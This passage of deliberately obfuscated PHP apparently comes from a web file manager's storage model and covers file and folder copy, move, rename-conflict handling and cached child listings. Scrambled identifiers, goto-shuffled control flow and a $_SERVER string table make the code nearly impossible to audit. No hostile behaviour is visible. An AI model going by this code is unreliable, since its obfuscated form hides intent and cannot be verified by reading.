$this->fileNameAutoCache($EÇ—ô¡Âßˆ, $f¶˜¬¦ì, $f“õë³³ÁÍ, $aœˆâ¸‹‹Ï); $f’´¤‹à‚© = $this->_copyCreate($b‡•ÙîÉ½Û, $EÇ—ô¡Âßˆ, $f¶˜¬¦ì, $BÓÙšÆ±çê); } else { if ($f“õë³³ÁÍ == REPEAT_REPLACE) { $Fó÷¡–Ë¤ = $this->sourceInfoCache($BğŒŒÎò‘); $EíâŠ¹…ã = $this->fileHistory($Fó÷¡–Ë¤, $e³ã ÈÒ‰[$FíÉñó××Æ[461]], $e³ã ÈÒ‰[$FíÉñó××Æ[78]]); if ($EíâŠ¹…ã) { $BÓÙšÆ±çê[$FíÉñó××Æ[554]][] = $e³ã ÈÒ‰[$FíÉñó××Æ[461]]; } } else { if ($f“õë³³ÁÍ == REPEAT_SKIP) { } } } Hook::trigger($FíÉñó××Æ[559], array($FíÉñó××Æ[560], $e³ã ÈÒ‰, 0)); } goto CÇÒ²ª‡Ñ‰; c¡Ç‘ì®“: $f¶˜¬¦ì = $A¡¾²Ï¥ò¾ ? $A¡¾²Ï¥ò¾ : $e³ã ÈÒ‰[$FíÉñó××Æ[28]]; $BğŒŒÎò‘ = $this->fileNameExistCache($EÇ—ô¡Âßˆ, $f¶˜¬¦ì); if ($CßñÅÉœê) { $this->_childrenAllMake($b‡•ÙîÉ½Û); if ($aœˆâ¸‹‹Ï && $BğŒŒÎò‘) { $this->_childrenAllMake($BğŒŒÎò‘); } } goto FÊÙŸ‘„«; CÇÒ²ª‡Ñ‰: return $f’´¤‹à‚©; goto CèƒƒµæÄ›; CèƒƒµæÄ›: } private function _copyCreate($C¼¼š§…ˆ–, $AÈÔØ®Üù‹, $a×Û¥ß–æˆ, &$böšˆÛø‚) { goto aµšÀºÕ§; ašÛ‹Ëš: if ($aËØ•‡¯¾²[$Fõµ¦«[405]] != $Fõµ¦«[87]) { $böšˆÛø‚[$Fõµ¦«[554]][] = $aËØ•‡¯¾²[$Fõµ¦«[461]]; return $eĞÙªâĞ‘½; } $c…Ø“¡®© = array(); $fÑ¼íˆ—í = array(); goto e—äÊİğ¹Û; DÚ¼—‡×©Ÿ: foreach ($D¾½Ö†ÍË¢ as $fÇ’ñòÜÂÃ) { $dÚè²šùÀ = $fÇ’ñòÜÂÃ[$Fõµ¦«[397]]; $FÜáªƒ”Ê© = $this->_childrenMatch($AÃÖöéÑæõ, $fÇ’ñòÜÂÃ, $b½º›òËÒÌ); $CßŠ¯à´ò[] = array($Fõµ¦«[397], $dÚè²šùÀ, $Fõµ¦«[492], $FÜáªƒ”Ê©[$Fõµ¦«[492]]); $C˜åˆÔ½¶[] = array($Fõµ¦«[397], $dÚè²šùÀ, $Fõµ¦«[515], $FÜáªƒ”Ê©[$Fõµ¦«[515]]); $this->_copyApplyMeta($fÇ’ñòÜÂÃ, $böšˆÛø‚); if ($fÇ’ñòÜÂÃ[$Fõµ¦«[405]] != $Fõµ¦«[87]) { $böšˆÛø‚[$Fõµ¦«[554]][] = $fÇ’ñòÜÂÃ[$Fõµ¦«[461]]; } } $this->chunkEventSet($Fõµ¦«[566], array($Fõµ¦«[567], $d¬ºÅß·‡, $f™¤¡ó…‡›)); $this->saveAll($CßŠ¯à´ò); goto f³Ï‘ä‹; e—äÊİğ¹Û: $this->_childrenListAll($C¼¼š§…ˆ–, $c…Ø“¡®©); $f™¤¡ó…‡› = count($c…Ø“¡®©); if ($f™¤¡ó…‡› == 0) { return $eĞÙªâĞ‘½; } goto A¿¿åÅ©å¦; f³Ï‘ä‹: $this->chunkEventSet($Fõµ¦«[568], array($Fõµ¦«[569], $d¬ºÅß·‡, $f™¤¡ó…‡›)); $this->saveAll($C˜åˆÔ½¶); return $eĞÙªâĞ‘½; goto C›¤£±ˆ; fìÖ¯ÚˆëØ: $this->addAll($fÑ¼íˆ—í, array(), !1); $D¾½Ö†ÍË¢ = $this->where(array($Fõµ¦«[492] => $eĞÙªâĞ‘½))->select(); $AÃÖöéÑæõ = $this->_childrenMakeRelation($c…Ø“¡®©, $D¾½Ö†ÍË¢); goto CßàÙ‘Ëí¥; aµšÀºÕ§: $Fõµ¦« =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aËØ•‡¯¾² = $this->sourceInfoCache($C¼¼š§…ˆ–); $cëçÀ¯ÉÏ = $this->sourceInfoCache($AÈÔØ®Üù‹); goto CİĞƒòŠ¶‘; CİĞƒòŠ¶‘: $d¬ºÅß·‡ = $this->_makeItemData($aËØ•‡¯¾², $cëçÀ¯ÉÏ, $a×Û¥ß–æˆ); Hook::trigger($Fõµ¦«[561], $d¬ºÅß·‡); Hook::trigger($Fõµ¦«[562], array($Fõµ¦«[563], $d¬ºÅß·‡, 0)); goto dà¸Óâëó; A¿¿åÅ©å¦: $b½º›òËÒÌ = $this->sourceInfo($eĞÙªâĞ‘½); foreach ($c…Ø“¡®© as $fÇ’ñòÜÂÃ) { $EóÜ¯Ì‹Ğ = $this->_makeItemData($fÇ’ñòÜÂÃ, $b½º›òËÒÌ, $fÇ’ñòÜÂÃ[$Fõµ¦«[28]]); $EóÜ¯Ì‹Ğ[$Fõµ¦«[515]] = $fÇ’ñòÜÂÃ[$Fõµ¦«[515]]; $fÑ¼íˆ—í[] = $EóÜ¯Ì‹Ğ; } $this->chunkEventSet($Fõµ¦«[564], array($Fõµ¦«[565], $d¬ºÅß·‡, $f™¤¡ó…‡›)); goto fìÖ¯ÚˆëØ; dà¸Óâëó: $eĞÙªâĞ‘½ = $this->add($d¬ºÅß·‡); $eÌš°•†™Ö = array($Fõµ¦«[397] => $eĞÙªâĞ‘½, $Fõµ¦«[28] => $a×Û¥ß–æˆ); $this->_copyApplyMeta($eÌš°•†™Ö, $böšˆÛø‚); goto ašÛ‹Ëš; CßàÙ‘Ëí¥: $AÃÖöéÑæõ[$C¼¼š§…ˆ–] = $eĞÙªâĞ‘½; $CßŠ¯à´ò = array(); $C˜åˆÔ½¶ = array(); goto DÚ¼—‡×©Ÿ; C›¤£±ˆ: } private function _childrenMakeRelation($F£İ¿½ë–Ù, $cÛŞö¹¦ä) { $Bğ·«•ëÚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F’Î§´ À = array(); $B—ÄĞ¿”ƒ¢ = array(); foreach ($F£İ¿½ë–Ù as $dèÉÇ˜÷‹ò) { $bĞµçùŞ­á = $dèÉÇ˜÷‹ò[$Bğ·«•ëÚ[28]] . $Bğ·«•ëÚ[8] . $dèÉÇ˜÷‹ò[$Bğ·«•ëÚ[515]]; $F’Î§´ À[$bĞµçùŞ­á] = $dèÉÇ˜÷‹ò[$Bğ·«•ëÚ[397]]; } foreach ($cÛŞö¹¦ä as $dèÉÇ˜÷‹ò) { $bĞµçùŞ­á = $dèÉÇ˜÷‹ò[$Bğ·«•ëÚ[28]] . $Bğ·«•ëÚ[8] . $dèÉÇ˜÷‹ò[$Bğ·«•ëÚ[515]]; $f«Õ›ÀØŠ = $F’Î§´ À[$bĞµçùŞ­á]; $B—ÄĞ¿”ƒ¢[$f«Õ›ÀØŠ] = $dèÉÇ˜÷‹ò[$Bğ·«•ëÚ[397]]; } return $B—ÄĞ¿”ƒ¢; } private function _childrenMatch($cÉéß›Ôíß, $aÀö’­÷¡›, $EíŠ¨«˜) { goto Cğ£áÀŠ¯Î; Cğ£áÀŠ¯Î: $aÜ½àëšê =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a¡ëš´¥¤÷ = $EíŠ¨«˜[$aÜ½àëšê[515]]; $cö¡Ô‚ÇÔŸ = $this->parentLevelArray($aÀö’­÷¡›[$aÜ½àëšê[515]]); goto FÒ›·³†İï; FÒ›·³†İï: foreach ($cö¡Ô‚ÇÔŸ as $B¦ğ‘§”•±) { if (isset($cÉéß›Ôíß[$B¦ğ‘§”•±])) { $a¡ëš´¥¤÷ .= $cÉéß›Ôíß[$B¦ğ‘§”•±] . $aÜ½àëšê[570]; } } $a¡ëš´¥¤÷ = rtrim($a¡ëš´¥¤÷, $aÜ½àëšê[47]) . $aÜ½àëšê[47]; $f‰¼ëˆö = $this->parentLevelArray($a¡ëš´¥¤÷); goto D³ÃŞß‰‘•; D³ÃŞß‰‘•: $a¨Ü¤–š¡ = $f‰¼ëˆö[count($f‰¼ëˆö) - 1]; return array($aÜ½àëšê[492] => $a¨Ü¤–š¡, $aÜ½àëšê[515] => $a¡ëš´¥¤÷); goto dòÍÊä¥’; dòÍÊä¥’: } private function _makeItemData($DÄô´×À ñ, $dï´õ‹Êİå, $aáÜ¥íÅË±) { $F‡íˆÅæÅ¶ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d²—¤ÍÜ = array($F‡íˆÅæÅ¶[571] => $DÄô´×À ñ[$F‡íˆÅæÅ¶[405]], $F‡íˆÅæÅ¶[415] => $aáÜ¥íÅË±, $F‡íˆÅæÅ¶[572] => $DÄô´×À ñ[$F‡íˆÅæÅ¶[407]] ? $DÄô´×À ñ[$F‡íˆÅæÅ¶[407]] : $F‡íˆÅæÅ¶[33], $F‡íˆÅæÅ¶[462] => $DÄô´×À ñ[$F‡íˆÅæÅ¶[461]] ? $DÄô´×À ñ[$F‡íˆÅæÅ¶[461]] : 0, $F‡íˆÅæÅ¶[573] => $DÄô´×À ñ[$F‡íˆÅæÅ¶[78]] ? $DÄô´×À ñ[$F‡íˆÅæÅ¶[78]] : 0, $F‡íˆÅæÅ¶[574] => intval($dï´õ‹Êİå[$F‡íˆÅæÅ¶[406]]), $F‡íˆÅæÅ¶[575] => intval($dï´õ‹Êİå[$F‡íˆÅæÅ¶[498]]), $F‡íˆÅæÅ¶[576] => intval(USER_ID), $F‡íˆÅæÅ¶[577] => intval(USER_ID), $F‡íˆÅæÅ¶[396] => intval($dï´õ‹Êİå[$F‡íˆÅæÅ¶[397]]), $F‡íˆÅæÅ¶[578] => $dï´õ‹Êİå[$F‡íˆÅæÅ¶[515]] . $dï´õ‹Êİå[$F‡íˆÅæÅ¶[397]] . $F‡íˆÅæÅ¶[47], $F‡íˆÅæÅ¶[419] => $DÄô´×À ñ[$F‡íˆÅæÅ¶[84]] ? $DÄô´×À ñ[$F‡íˆÅæÅ¶[84]] : time(), $F‡íˆÅæÅ¶[424] => 0, $F‡íˆÅæÅ¶[579] => $F‡íˆÅæÅ¶[33]); return $d²—¤ÍÜ; } private function _copyApplyMeta($CˆÙ³¢ ”, &$b½õÁÓ¹Ó–) { $A²–Û›«Äİ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Fˆá¼¶´ = $CˆÙ³¢ ”[$A²–Û›«Äİ[397]]; $e·î÷Œ½ë˜ = $CˆÙ³¢ ”[$A²–Û›«Äİ[28]]; if (!isset($CˆÙ³¢ ”[$A²–Û›«Äİ[580]]) || !$CˆÙ³¢ ”[$A²–Û›«Äİ[580]] || $CˆÙ³¢ ”[$A²–Û›«Äİ[580]] == $A²–Û›«Äİ[191]) { $b½õÁÓ¹Ó–[$A²–Û›«Äİ[556]][] = array($A²–Û›«Äİ[397], $Fˆá¼¶´, $A²–Û›«Äİ[580], short_id($Fˆá¼¶´)); } if (Input::check($e·î÷Œ½ë˜, $A²–Û›«Äİ[581])) { $b½õÁÓ¹Ó–[$A²–Û›«Äİ[555]][] = array($A²–Û›«Äİ[397] => $Fˆá¼¶´, $A²–Û›«Äİ[93] => $A²–Û›«Äİ[458], $A²–Û›«Äİ[372] => str_replace($A²–Û›«Äİ[50], $A²–Û›«Äİ[33], Pinyin::get($e·î÷Œ½ë˜))); $b½õÁÓ¹Ó–[$A²–Û›«Äİ[555]][] = array($A²–Û›«Äİ[397] => $Fˆá¼¶´, $A²–Û›«Äİ[93] => $A²–Û›«Äİ[457], $A²–Û›«Äİ[372] => Pinyin::get($e·î÷Œ½ë˜, $A²–Û›«Äİ[582])); } $b½õÁÓ¹Ó–[$A²–Û›«Äİ[555]][] = array($A²–Û›«Äİ[397] => $Fˆá¼¶´, $A²–Û›«Äİ[93] => $A²–Û›«Äİ[436], $A²–Û›«Äİ[372] => KodSort::makeStr($e·î÷Œ½ë˜)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($FÖÛ©‘‹’‘) { goto aÒ»–ÌŠ‚Ö; F¦ÃØôß°¡: $d»°’ğƒ®À = array_to_keyvalue($d»°’ğƒ®À, $d†í‚‹Ñˆµ[397]); foreach ($d»°’ğƒ®À as $Cõ²Æ¤é) { $f»ĞÂ¦ÄÎ = $Cõ²Æ¤é[$d†í‚‹Ñˆµ[492]]; $FÖÛ©‘‹’‘ = $Cõ²Æ¤é[$d†í‚‹Ñˆµ[397]]; if (!isset($this->_childrenListCache[$FÖÛ©‘‹’‘]) && $Cõ²Æ¤é[$d†í‚‹Ñˆµ[405]] == $d†í‚‹Ñˆµ[87]) { $this->_childrenListCache[$FÖÛ©‘‹’‘] = array(); } if (!isset($this->_childrenListCache[$f»ĞÂ¦ÄÎ])) { $this->_childrenListCache[$f»ĞÂ¦ÄÎ] = array(); } $this->_childrenListCache[$f»ĞÂ¦ÄÎ][$FÖÛ©‘‹’‘] = $Cõ²Æ¤é; $this->_childrenItemCache[$FÖÛ©‘‹’‘] = $Cõ²Æ¤é; } goto dÎ³İÆ‹›; DÃ‰©˜¿ƒ: $EèÀ“ùäí¯ = array($d†í‚‹Ñˆµ[515] => array($d†í‚‹Ñˆµ[538], $DÏáùé[$d†í‚‹Ñˆµ[515]] . $FÖÛ©‘‹’‘ . $d†í‚‹Ñˆµ[539]), $d†í‚‹Ñˆµ[425] => $this->targetIsDelete); $d»°’ğƒ®À = $this->field($A¿÷æ½˜†)->where($EèÀ“ùäí¯)->select(); if (!$d»°’ğƒ®À) { return; } goto F¦ÃØôß°¡; aÒ»–ÌŠ‚Ö: $d†í‚‹Ñˆµ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DÏáùé = $this->sourceInfo($FÖÛ©‘‹’‘); $A¿÷æ½˜† = $d†í‚‹Ñˆµ[583]; goto DÃ‰©˜¿ƒ; dÎ³İÆ‹›: } private function _childrenListAll($C¿¡½»Ñ‚Ò, &$D©Ö‘ò‹Ø) { $b¦÷©›¿¾ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!isset($this->_childrenListCache[$C¿¡½»Ñ‚Ò])) { return; } $dÕ¶¥»‚ê = $this->_childrenListCache[$C¿¡½»Ñ‚Ò]; foreach ($dÕ¶¥»‚ê as $eÛÃèÉÚ³¨ => $CŠñ›™—Øš) { $D©Ö‘ò‹Ø[$eÛÃèÉÚ³¨] = $CŠñ›™—Øš; if ($CŠñ›™—Øš[$b¦÷©›¿¾[405]] == $b¦÷©›¿¾[87]) { $this->_childrenListAll($eÛÃèÉÚ³¨, $D©Ö‘ò‹Ø); } } } private function sourceInfoCache($DÏ†Ëğ’Ç„) { if (isset($this->_childrenItemCache[$DÏ†Ëğ’Ç„])) { return $this->_childrenItemCache[$DÏ†Ëğ’Ç„]; } return $this->sourceInfo($DÏ†Ëğ’Ç„); } private function _childrenList($Eğâ”„¦ˆ›) { if (isset($this->_childrenListCache[$Eğâ”„¦ˆ›])) { return $this->_childrenListCache[$Eğâ”„¦ˆ›]; } return $this->_childrenListSelect($Eğâ”„¦ˆ›); } private function _childrenListSelect($FŒ…Òî¸…) { goto bßª–òÄä‹; bßª–òÄä‹: $FŠÁ³æ ‡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dŠÓÁºÀˆÍ = array($FŠÁ³æ ‡[492] => $FŒ…Òî¸…, $FŠÁ³æ ‡[425] => $this->targetIsDelete); $f¡ø÷èĞÊ = $this->where($dŠÓÁºÀˆÍ)->select(); goto bÒŞ³ÛÙõ; bÒŞ³ÛÙõ: $f¡ø÷èĞÊ = $f¡ø÷èĞÊ ? $f¡ø÷èĞÊ : array(); $cëàµÓ»¼ = array_to_keyvalue($f¡ø÷èĞÊ, $FŠÁ³æ ‡[397]); $this->_childrenListCache[$FŒ…Òî¸…] = $cëàµÓ»¼; goto bÖ„¸ğğè†; bÖ„¸ğğè†: foreach ($cëàµÓ»¼ as $FŒ…Òî¸… => $aŠÊ¸·ÚÂ) { $this->_childrenItemCache[$FŒ…Òî¸…] = $aŠÊ¸·ÚÂ; } return $cëàµÓ»¼; goto a÷“ä¶‡è; a÷“ä¶‡è: } private function fileNameExistCache($f—í¶…ƒğ£, $eÔèÁŒ•‰ñ) { $AöäÜÓ¥®Ë =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÔèÁŒ•‰ñ = strtolower($eÔèÁŒ•‰ñ); $Cé…ˆ¾™µ« = $this->_childrenList($f—í¶…ƒğ£); foreach ($Cé…ˆ¾™µ« as $eó…ãŒ®ùî) { if ($eÔèÁŒ•‰ñ == strtolower($eó…ãŒ®ùî[$AöäÜÓ¥®Ë[28]])) { return $eó…ãŒ®ùî[$AöäÜÓ¥®Ë[397]]; } } return !1; } private function fileNameAutoCache($E·¹Ë Á©, $b˜‰‰–µ“÷, $DİØ´„ÅĞ, $E•§Š´Óá×) { $eÉ‚İ‘ÔçÊ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Dóµõ ÇÅ¯ = $this->_childrenList($E·¹Ë Á©); $C÷¥ª„âÓ = array_to_keyvalue($Dóµõ ÇÅ¯, $eÉ‚İ‘ÔçÊ[33], $eÉ‚İ‘ÔçÊ[28]); return $this->fileNameAutoGet($C÷¥ª„âÓ, $b˜‰‰–µ“÷, $DİØ´„ÅĞ, $E•§Š´Óá×); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($D™Íº„ÜÆÀ, $e¡¦Ğ’’£¬, $cŒ’ñ¼¬Ì„ = REPEAT_REPLACE, $FÁØ½¼›£Ä = '') { goto Bç³ÀôÛ–¯; F°…ºåÏ™: if ($b Ø´¹ÃÀ[$AïêËº´ƒÏ[405]] == $AïêËº´ƒÏ[87] && $a‚ÎÕ”á…ê) { $this->folderSizeResetChildren($EÅ«’·Ù); } Model($AïêËº´ƒÏ[193])->linkAdd($e…—ä—£¸¤[$AïêËº´ƒÏ[554]]); if ($a‚ÎÕ”á…ê && $e…—ä—£¸¤[$AïêËº´ƒÏ[586]]) { $this->removeNow($D™Íº„ÜÆÀ, !1); } goto E‰ª‰ºÌÊ›; E‰ª‰ºÌÊ›: $this->lockMoveEnd($D™Íº„ÜÆÀ); $this->lockWriteEnd($e¡¦Ğ’’£¬, $FïîÚæÂ“); $this->folderSizeReset($b Ø´¹ÃÀ[$AïêËº´ƒÏ[492]]); goto BÒïğ½Ğ¦ì; CŒŠ²¡ê¡×: $a‚ÎÕ”á…ê = $this->fileNameExistCache($e¡¦Ğ’’£¬, $b Ø´¹ÃÀ[$AïêËº´ƒÏ[28]]); $EÅ«’·Ù = $this->_move($D™Íº„ÜÆÀ, $e¡¦Ğ’’£¬, $cŒ’ñ¼¬Ì„, $e…—ä—£¸¤, $FÁØ½¼›£Ä); $this->sourceCacheClear(); goto F°…ºåÏ™; bƒèˆ¸ÛÄÒ: if (!$b Ø´¹ÃÀ || !$aĞá¶ìèÓ¬ || $aĞá¶ìèÓ¬[$AïêËº´ƒÏ[405]] != $AïêËº´ƒÏ[87]) { return !1; } Hook::trigger($AïêËº´ƒÏ[584], $bÔÀ¥§Ğ‚‰); $this->targetIsDelete = intval($b Ø´¹ÃÀ[$AïêËº´ƒÏ[425]]); goto d·ˆ–“Ã; Bç³ÀôÛ–¯: $AïêËº´ƒÏ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b Ø´¹ÃÀ = $this->sourceInfo($D™Íº„ÜÆÀ); $aĞá¶ìèÓ¬ = $this->sourceInfo($e¡¦Ğ’’£¬); goto DÂñ§ŞÉĞ; fÍ£è÷„ˆ­: $this->updateModifyTime($B´™à„Ñèö); Model($AïêËº´ƒÏ[558])->eventMove($D™Íº„ÜÆÀ, $b Ø´¹ÃÀ[$AïêËº´ƒÏ[492]], $e¡¦Ğ’’£¬); Hook::trigger($AïêËº´ƒÏ[585], $bÔÀ¥§Ğ‚‰); goto a¹ç¸Ø‹§Ò; BÒïğ½Ğ¦ì: $this->folderSizeReset($e¡¦Ğ’’£¬); $B´™à„Ñèö = array($b Ø´¹ÃÀ[$AïêËº´ƒÏ[492]], $e¡¦Ğ’’£¬); if ($b Ø´¹ÃÀ[$AïêËº´ƒÏ[405]] == $AïêËº´ƒÏ[87]) { $B´™à„Ñèö[] = $D™Íº„ÜÆÀ; } goto fÍ£è÷„ˆ­; a¹ç¸Ø‹§Ò: return $EÅ«’·Ù; goto F£›¦”®ñé; d·ˆ–“Ã: if ($b Ø´¹ÃÀ[$AïêËº´ƒÏ[492]] == $e¡¦Ğ’’£¬ && $FÁØ½¼›£Ä != $b Ø´¹ÃÀ[$AïêËº´ƒÏ[28]]) { $BÁß§µÂ = $this->fileNameExist($e¡¦Ğ’’£¬, $FÁØ½¼›£Ä); if ($BÁß§µÂ && $b Ø´¹ÃÀ[$AïêËº´ƒÏ[405]] == $AïêËº´ƒÏ[191]) { goto CÂ³Šäá¤‘; AÓ‘ÀÇ¢Šâ: return $BÁß§µÂ; goto A„‹”Èæºª; CÂ³Šäá¤‘: $fÛ·º Ñ…Í = $this->sourceInfo($BÁß§µÂ); $CÛ‹Áã”÷ã = $this->fileHistory($fÛ·º Ñ…Í, $b Ø´¹ÃÀ[$AïêËº´ƒÏ[461]], $b Ø´¹ÃÀ[$AïêËº´ƒÏ[78]]); if (!$CÛ‹Áã”÷ã) { Model($AïêËº´ƒÏ[464])->remove($b Ø´¹ÃÀ[$AïêËº´ƒÏ[461]]); } goto Bà©åáˆßØ; Bà©åáˆßØ: $this->removeNow($D™Íº„ÜÆÀ, !1); $this->folderSizeReset($e¡¦Ğ’’£¬); Hook::trigger($AïêËº´ƒÏ[585], $bÔÀ¥§Ğ‚‰); goto AÓ‘ÀÇ¢Šâ; A„‹”Èæºª: } } $FïîÚæÂ“ = $FÁØ½¼›£Ä ? $FÁØ½¼›£Ä : $b Ø´¹ÃÀ[$AïêËº´ƒÏ[28]]; $this->lockMoveStart($D™Íº„ÜÆÀ); goto Báìí²”ä; DÂñ§ŞÉĞ: if ($b Ø´¹ÃÀ[$AïêËº´ƒÏ[492]] == $aĞá¶ìèÓ¬[$AïêËº´ƒÏ[397]]) { if ($b Ø´¹ÃÀ[$AïêËº´ƒÏ[425]] == $AïêËº´ƒÏ[87]) { Model($AïêËº´ƒÏ[423])->restore(array($D™Íº„ÜÆÀ)); } if (!$FÁØ½¼›£Ä || $FÁØ½¼›£Ä == $b Ø´¹ÃÀ[$AïêËº´ƒÏ[28]]) { return $D™Íº„ÜÆÀ; } } $bÔÀ¥§Ğ‚‰ = $this->pathInfoMore($D™Íº„ÜÆÀ); if ($this->isParentOf($D™Íº„ÜÆÀ, $e¡¦Ğ’’£¬)) { return !1; } goto bƒèˆ¸ÛÄÒ; Báìí²”ä: $this->lockWriteStart($e¡¦Ğ’’£¬, $FïîÚæÂ“); $e…—ä—£¸¤ = array($AïêËº´ƒÏ[554] => array(), $AïêËº´ƒÏ[586] => !1); $this->clearShare($D™Íº„ÜÆÀ, $e¡¦Ğ’’£¬); goto CŒŠ²¡ê¡×; F£›¦”®ñé: } private function _move($AÃ«­Ë¦‚ï, $DÕ¸Ì½¨³, $eéÊ÷‡ùã, &$f²·Ôš—¿ù, $bÒƒ·—šÕ = '') { goto dÕ£‚Š†‰¼; d‰§ŠË¤ê: $fø«ƒÄÁä§ = !1; if ($Fßù¸÷›) { if ($eéÊ÷‡ùã == REPEAT_RENAME_FOLDER) { $cÑ­¢Ô¸°¨ = $this->fileNameAuto($DÕ¸Ì½¨³, $cÑ­¢Ô¸°¨, $eéÊ÷‡ùã, $Fßù¸÷›); $b¢¬éÖïµÅ = $this->_moveForce($AÃ«­Ë¦‚ï, $DÕ¸Ì½¨³, $cÑ­¢Ô¸°¨); } else { if ($eéÊ÷‡ùã == REPEAT_RENAME_FOLDER) { $eéÊ÷‡ùã = REPEAT_RENAME; } $F²Ğ»¡ˆÄÕ = $this->_childrenListSelect($AÃ«­Ë¦‚ï); foreach ($F²Ğ»¡ˆÄÕ as $A²™¹Üñá) { $this->_move($A²™¹Üñá[$eé¸Ü£¡½â[397]], $fˆŸÇïùµó, $eéÊ÷‡ùã, $f²·Ôš—¿ù); } $fø«ƒÄÁä§ = !0; } } else { if ($eéÊ÷‡ùã == REPEAT_SKIP) { $fø«ƒÄÁä§ = !0; } else { if ($eéÊ÷‡ùã == REPEAT_RENAME || $eéÊ÷‡ùã == REPEAT_RENAME_FOLDER) { $cÑ­¢Ô¸°¨ = $this->fileNameAuto($DÕ¸Ì½¨³, $cÑ­¢Ô¸°¨, $eéÊ÷‡ùã, $Fßù¸÷›); $b¢¬éÖïµÅ = $this->_moveForce($AÃ«­Ë¦‚ï, $DÕ¸Ì½¨³, $cÑ­¢Ô¸°¨); } else { if ($eéÊ÷‡ùã == REPEAT_REPLACE) { $B®µêä“³ö = $this->sourceInfoCache($fˆŸÇïùµó); $f±Ì˜ŞÊá = $this->fileHistory($B®µêä“³ö, $B© ÚçÔ“À[$eé¸Ü£¡½â[461]], $B© ÚçÔ“À[$eé¸Ü£¡½â[78]]); $fø«ƒÄÁä§ = !0; if ($f±Ì˜ŞÊá) { $f²·Ôš—¿ù[$eé¸Ü£¡½â[554]][] = $B© ÚçÔ“À[$eé¸Ü£¡½â[461]]; } } } } } if ($fø«ƒÄÁä§ && !$f²·Ôš—¿ù[$eé¸Ü£¡½â[586]]) { $f²·Ôš—¿ù[$eé¸Ü£¡½â[586]] = !0; } goto AíˆçÉÈÇ‘; bÍ’Ì²¢Ÿ›: $this->lockWriteStart($DÕ¸Ì½¨³, $cÑ­¢Ô¸°¨); if (!$fˆŸÇïùµó) { return $this->_moveForce($AÃ«­Ë¦‚ï, $DÕ¸Ì½¨³, $cÑ­¢Ô¸°¨); } $b¢¬éÖïµÅ = $fˆŸÇïùµó; goto d‰§ŠË¤ê; E’÷Êø¬Ú: $cÑ­¢Ô¸°¨ = $bÒƒ·—šÕ ? $bÒƒ·—šÕ : $B© ÚçÔ“À[$eé¸Ü£¡½â[28]]; $fˆŸÇïùµó = $this->fileNameExistCache($DÕ¸Ì½¨³, $cÑ­¢Ô¸°¨); $this->lockMoveStart($AÃ«­Ë¦‚ï); goto bÍ’Ì²¢Ÿ›; AíˆçÉÈÇ‘: return $b¢¬éÖïµÅ; goto dÄ‚¾«â¿; dÕ£‚Š†‰¼: $eé¸Ü£¡½â =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $B© ÚçÔ“À = $this->sourceInfo($AÃ«­Ë¦‚ï); $Fßù¸÷› = $B© ÚçÔ“À[$eé¸Ü£¡½â[405]] == $eé¸Ü£¡½â[87]; goto E’÷Êø¬Ú; dÄ‚¾«â¿: } private function _moveForce($a£¯È¨Áæ¡, $C¯Œ¼İË, $C÷šÛœ¡²î) { goto D‘õ¨’Í‹ƒ; A§“ç²Š: if ($DÅõñå·Ê) { $Aç‰É§¬ìÀ = array($aéÑ»ø£Ö[578] => array($aéÑ»ø£Ö[538], $eØ¼ÀèÅ¡µ[$aéÑ»ø£Ö[515]] . $eØ¼ÀèÅ¡µ[$aéÑ»ø£Ö[397]] . $aéÑ»ø£Ö[539])); $CˆÈĞÚ»îğ = $eØ¼ÀèÅ¡µ[$aéÑ»ø£Ö[515]] . $eØ¼ÀèÅ¡µ[$aéÑ»ø£Ö[397]] . $aéÑ»ø£Ö[47]; $eÔÙ½â‘´ = $aŒëî±Òë½[$aéÑ»ø£Ö[515]] . $aŒëî±Òë½[$aéÑ»ø£Ö[397]] . $aéÑ»ø£Ö[47] . $eØ¼ÀèÅ¡µ[$aéÑ»ø£Ö[397]] . $aéÑ»ø£Ö[47]; $C«³óáÇ = array($aéÑ»ø£Ö[578] => array($aéÑ»ø£Ö[587], "\x72\145\x70\154\x61\x63\x65\x28\160\141\162\x65\156\x74\114\x65\166\x65\x6c\x2c\47{$CˆÈĞÚ»îğ}\47\54\x27{$eÔÙ½â‘´}\47\x29"), $aéÑ»ø£Ö[574] => $aŒëî±Òë½[$aéÑ»ø£Ö[406]], $aéÑ»ø£Ö[575] => $aŒëî±Òë½[$aéÑ»ø£Ö[498]]); if ($C³•ÉÎ) { $C«³óáÇ[$aéÑ»ø£Ö[424]] = 0; } $this->where($Aç‰É§¬ìÀ)->data($C«³óáÇ)->save(); } $this->where(array($aéÑ»ø£Ö[412] => $a£¯È¨Áæ¡))->data($A½éù×³‰®)->save(); return $a£¯È¨Áæ¡; goto BòÂÂÍ—ÑÄ; C¨àç†ç™µ: $DÅõñå·Ê = $eØ¼ÀèÅ¡µ[$aéÑ»ø£Ö[405]] == $aéÑ»ø£Ö[87]; $A½éù×³‰® = array($aéÑ»ø£Ö[396] => $aŒëî±Òë½[$aéÑ»ø£Ö[397]], $aéÑ»ø£Ö[578] => $aŒëî±Òë½[$aéÑ»ø£Ö[515]] . $aŒëî±Òë½[$aéÑ»ø£Ö[397]] . $aéÑ»ø£Ö[47], $aéÑ»ø£Ö[574] => $aŒëî±Òë½[$aéÑ»ø£Ö[406]], $aéÑ»ø£Ö[575] => $aŒëî±Òë½[$aéÑ»ø£Ö[498]], $aéÑ»ø£Ö[577] => USER_ID, $aéÑ»ø£Ö[415] => $C÷šÛœ¡²î); $cˆ£Ú¥¸í = $eØ¼ÀèÅ¡µ[$aéÑ»ø£Ö[406]] == SourceModel::TYPE_GROUP && $aŒëî±Òë½[$aéÑ»ø£Ö[406]] == SourceModel::TYPE_GROUP && $eØ¼ÀèÅ¡µ[$aéÑ»ø£Ö[498]] == 